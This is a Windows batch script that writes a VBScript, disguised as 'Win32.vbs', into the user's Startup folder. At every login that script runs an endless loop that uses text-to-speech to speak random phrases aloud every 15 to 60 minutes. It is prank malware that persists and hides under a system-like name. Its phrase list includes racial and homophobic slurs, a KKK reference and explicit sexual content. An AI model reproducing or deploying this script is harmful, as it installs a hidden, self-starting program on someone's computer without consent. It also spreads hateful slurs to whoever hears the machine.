@echo off
:: makes sure we're on system drive - usually C:/
%SystemDrive%

cd %APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup

:: Delete so we create fresh file

del Win32.vbs

:: Begin writing vbs file

echo set sapi = Wscript.CreateObject("SAPI.SpVoice") > Win32.vbs 
echo Dim phrases(41) >> Win32.vbs
echo Dim phrase_max, phrase_min >> Win32.vbs
echo phrase_max = UBound(phrases) >> Win32.vbs
echo phrase_min = 0 >> Win32.vbs

echo Dim rmax, rmin, start, repeat >> Win32.vbs
echo rmax=3600000 >> Win32.vbs
echo rmin=900000 >> Win32.vbs

echo phrases(0)  = "why do I have so an hard feeling in my pants at the morning" >> Win32.vbs
echo phrases(1)  = "tongue punch her in the fart box" >> Win32.vbs
echo phrases(2)  = "I would drag my balls down a runway covered in thumbtacks just to hear her fart through a walkie talkie" >> Win32.vbs
echo phrases(3)  = "faded faded faded muh nigga I'm faded" >> Win32.vbs
echo phrases(4)  = "faggot cunt nigger deer" >> Win32.vbs
echo phrases(5)  = "fuck shit stack" >> Win32.vbs
echo phrases(6)  = "shit shat shart" >> Win32.vbs
echo phrases(7)  = "shrek is love. shrek is life" >> Win32.vbs
echo phrases(8)  = "half life 3 confirmed" >> Win32.vbs
echo phrases(9)  = "yolo" >> Win32.vbs
echo phrases(10) = "sit on my face you'll love it" >> Win32.vbs
echo phrases(11) = "can confirm, am nigger" >> Win32.vbs
echo phrases(12) = "d hey e tits or g t f o" >> Win32.vbs
echo phrases(13) = "leh ell someone get this man gold" >> Win32.vbs
echo phrases(14) = "insert your floppy into my disk drive" >> Win32.vbs
echo phrases(15) = "quit being a faggot and suck that dick" >> Win32.vbs
echo phrases(16) = "finger my taint, you filthy whore monger" >> Win32.vbs
echo phrases(17) = "and have a great kkk, kkk, kkk, kkk, kkk, kay kay, kay kay" >> Win32.vbs
echo phrases(18) = "it's the fucking moon man" >> Win32.vbs
echo phrases(19) = "this better not be mcdonalds" >> Win32.vbs
echo phrases(20) = "how about her ass being filled with moon cock" >> Win32.vbs
echo phrases(21) = "wait, did you say gingers? are you sure you dont mean niggers?" >> Win32.vbs
echo phrases(22) = "oh no, you don't go, after the moon man" >> Win32.vbs
echo phrases(23) = "you are going to have, plenty of, things in, you when I fill your cunt with a shopping cart full of cactuses, and a marching band" >> Win32.vbs
echo phrases(25) = "wiggle wiggle wiggle wiggle wiggle, yeah" >> Win32.vbs
echo phrases(26) = "jostle my waffles" >> Win32.vbs
echo phrases(27) = "nipples and dicks" >> Win32.vbs
echo phrases(28) = "shit mother fucker ass tits cunt cock mother fucker shit ass tits mother fucker shit come on" >> Win32.vbs
echo phrases(29) = "you take some fuck, then some shit, then some fuck, then some shit you got a fuck shit stack, a fuck shit stack" >> Win32.vbs
echo phrases(30) = "it's a stack of fuck shit on top of itself nigga" >> Win32.vbs
echo phrases(31) = "I'm a cartoon character, you'll never be able to be like me" >> Win32.vbs
echo phrases(32) = "I like to take some car polish, smother it all over their asses and buff that shit out so it looks like fresh peaches and shit" >> Win32.vbs
echo phrases(33) = "Cause I'm a ladies man, a ladies man, a la la la la la la la la ladies man" >> Win32.vbs
echo phrases(34) = "I take a piece of shit car and I lower the mother fucker" >> Win32.vbs
echo phrases(35) = "put some 18 inch rims on the mother fucker" >> Win32.vbs
echo phrases(36) = "take some neon put it underneath the mother fucker so when I roll around this town it looks like I huhvah, huhvah, huhvah" >> Win32.vbs
echo phrases(37) = "one on the steering column, one inside of the glovebox, one on top of the dashboard, two in the back of the headrests, one mounted in the ceiling, two still in the mother fucking packaging in the back seat so when my mother fucking friends go and sit on the shit and break it I can honestly say, I, just, don't, give, a, fuck" >> Win32.vbs
echo phrases(38) = "clean yourself up" >> Win32.vbs
echo phrases(39) = "my butt hole this big" >> Win32.vbs
echo phrases(40) = "sit on my throne, with a dick in my butt" >> Win32.vbs
echo phrases(41) = "never forgetti your mother's spaghetti, which she made when your palms were sweaty, knees weak, and arms heavy, especially when there's vomit on your sweater already. don't get unsteady, it's a tad petty, I'm not a regular yeti who eats briccetti. I like to throw confetti and be a bouncing betty, or my name isn't dante gabriel rossetti. bottom text." >> Win32.vbs

echo do >> Win32.vbs

echo Randomize >> Win32.vbs
echo phrase_selection = Int((phrase_max-phrase_min+1)*Rnd+phrase_min) >> Win32.vbs

echo sapi.speak phrases(phrase_selection) >> Win32.vbs

echo Randomize >> Win32.vbs
echo repeat=(Int((rmax-rmin+1)*Rnd+rmin)) >> Win32.vbs
echo wscript.sleep repeat >> Win32.vbs

echo loop >> Win32.vbs
